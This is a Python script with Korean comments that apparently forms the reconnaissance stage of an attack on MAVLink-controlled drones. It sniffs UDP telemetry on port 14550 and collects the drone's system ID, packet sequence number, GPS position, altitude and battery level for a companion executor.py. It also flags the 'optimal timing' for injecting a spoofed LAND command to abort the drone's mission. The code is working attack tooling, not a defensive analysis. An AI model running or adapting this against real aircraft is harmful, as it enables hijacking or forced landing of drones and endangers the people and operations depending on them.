import time
from pymavlink import mavutil

# ─────────────────────────────────────────
# 수신 설정
# ─────────────────────────────────────────
LISTEN_HOST = '0.0.0.0'  # 모든 IP에서 오는 패킷 수신
LISTEN_PORT = 14550

# 정찰로 알아낸 정보 저장소
# executor.py가 이 값들을 가져다 공격에 사용
intel = {
    'sys_id'   : None,   # 드론 고유 번호
    'last_seq' : None,   # 마지막 패킷 번호
    'lat'      : None,   # 위도
    'lon'      : None,   # 경도
    'alt'      : None,   # 고도 (m)
    'fuel'     : None,   # 연료 잔량 (%)
    'speed'    : None,   # 속도
    'mission'  : 'RECON' # 현재 임무
}


def print_intel():
    # 현재까지 알아낸 정보 출력
    print("─" * 50)
    print(f"[INTEL] SYS_ID  = {intel['sys_id']}")
    print(f"[INTEL] SEQ     = {intel['last_seq']}  ← 다음 공격 패킷은 {(intel['last_seq'] or 0) + 1}번")
    print(f"[INTEL] 위치    = 위도 {intel['lat']} / 경도 {intel['lon']}")
    print(f"[INTEL] 고도    = {intel['alt']}m")
    print(f"[INTEL] 연료    = {intel['fuel']}%")
    print("─" * 50)


def assess_attack_timing():
    # 공격 타이밍 판단
    # 연료 30% 이상 + 고도 1000m 이상 = 임무 한창 수행 중 → 공격 효과 최대
    fuel = intel['fuel']
    alt  = intel['alt']

    if fuel is None or alt is None:
        return  # 아직 정보 부족

    if fuel >= 30 and alt >= 1000:
        print(f"[RECON] ⚠️  공격 최적 타이밍 — 연료={fuel}% 고도={alt}m")
        print(f"[RECON] ⚠️  LAND 명령 주입 시 임무 중단 가능")
    else:
        print(f"[RECON] 공격 타이밍 아님 — 연료={fuel}% 고도={alt}m")


def main():
    print(f"[RECON] 감시 시작 — UDP {LISTEN_PORT} 포트 도청 중...")
    print(f"[RECON] 송골매 UAV 패킷 분석 중")

    # udpin = UDP로 패킷 받는 방향
    mav = mavutil.mavlink_connection(
        f'udpin:{LISTEN_HOST}:{LISTEN_PORT}'
    )

    while True:
        # 패킷 올 때까지 대기
        msg = mav.recv_match(blocking=True)
        if msg is None:
            continue

        msg_type = msg.get_type()

        # SYS_ID + SEQ 는 모든 패킷에서 추출
        intel['sys_id']   = msg.get_srcSystem()
        intel['last_seq'] = msg._header.seq

        # ─────────────────────────────────────────
        # HEARTBEAT 수신
        # ─────────────────────────────────────────
        if msg_type == 'HEARTBEAT':
            print(f"[RECON] HEARTBEAT 수신 | SYS_ID={intel['sys_id']} | SEQ={intel['last_seq']}")

        # ─────────────────────────────────────────
        # SYS_STATUS 수신 → 연료 잔량 추출
        # ─────────────────────────────────────────
        elif msg_type == 'SYS_STATUS':
            intel['fuel'] = msg.battery_remaining  # 연료 잔량 %
            print(f"[RECON] SYS_STATUS 수신 | 연료={intel['fuel']}% | SEQ={intel['last_seq']}")

        # ─────────────────────────────────────────
        # GLOBAL_POSITION_INT 수신 → GPS 좌표 + 고도 추출
        # ISR 위변조 공격의 핵심 타깃
        # ─────────────────────────────────────────
        elif msg_type == 'GLOBAL_POSITION_INT':
            intel['lat'] = msg.lat / 1e7   # 정수 → 실제 위도로 변환
            intel['lon'] = msg.lon / 1e7   # 정수 → 실제 경도로 변환
            intel['alt'] = msg.alt / 1000  # mm → m 로 변환
            print(
                f"[RECON] POSITION 수신 | "
                f"위도={intel['lat']} 경도={intel['lon']} "
                f"고도={intel['alt']}m | SEQ={intel['last_seq']}"
            )

            # GPS 좌표 받을 때마다 공격 타이밍 판단
            assess_attack_timing()

        # 5초마다 전체 정보 요약 출력
        if intel['last_seq'] and intel['last_seq'] % 10 == 0:
            print_intel()


if __name__ == '__main__':
    main()